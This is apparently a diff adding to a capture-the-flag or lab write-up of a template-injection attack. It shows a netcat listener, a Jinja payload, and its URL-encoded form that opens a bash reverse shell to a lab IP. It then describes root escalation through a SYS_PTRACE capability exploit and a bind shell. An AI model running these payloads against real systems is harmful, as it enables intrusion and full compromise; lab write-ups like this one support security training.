@@ -59,4 +59,20 @@ I can now try a server-side injection by putting a calculation in as a value to 
 
 <img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/81bb76af-f6a4-4e7c-9560-7e59cb4d8b4d" />
 
-This result shows me that any command can be passed in as a payload and something will be returned.
+This result shows me that any command can be passed in as a payload and something will be returned. At this point, it was time to start up the netcat listener to get ready for the reverse shell. I ran **nc -nlvp 5555** and then created my payload. I used **{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.19.130/5555 0>&1"')}}** and then encoded it as a URL in Burp to be **%7b%25%20%69%6d%70%6f%72%74%20%6f%73%20%25%7d%7b%7b%6f%73%2e%73%79%73%74%65%6d%28%27%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%39%2e%31%33%30%2f%35%35%35%35%20%30%3e%26%31%22%27%29%7d%7d%0a**.
+
+<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/26fd860e-257f-445b-8121-5d70a44b3941" />
+
+I added the encoded URL and set it as the value to the name parameter. I then sent the request to the server and a reverse shell was generated.
+
+<img width="1272" height="609" alt="image" src="https://github.com/user-attachments/assets/e156fee5-a539-41c2-be92-e266f839f976" />
+
+From here I checked the capabilities of different binaries on the machine. The highlighted binary allows us the root shell. I read this page to understand learn more about this: https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc
+
+<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/a483107e-c9ce-46a8-a8c6-51627e51b832" />
+
+Here, I am going to use the process id 939. There is an exploit code linked in the blog post that I was reading above. I have to keep this exploit on the target. Furthermore, it requires the PID of the process as an argument. After I execute the exploit, it creates a bind shell on port 5600. I can then connect to the bind shell and get the root shell. On the target machine, I created a nano file called **inject.py** and pasted a python script in it. I was trying to run open a nano file earlier in the shell but it wasn't interactive enough so I upgraded it to a more interative terminal using **python3 -c 'import pty; pty.spawn("/bin/bash")'** which allowed me to open a nano file. 
+
+After that, I exploited the weak capability through python by providing the process ID of the process being run as root. The exploit information would create a bind shell at port 5600, as seen in the following screenshot.  I would then connect to the bind shell through **nc** on my attacker machine which would grant root access of the target machine. I confirmed this with with whoami.
+
+<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/fff50fbd-2bba-46e2-816f-a832e3002ab2" />
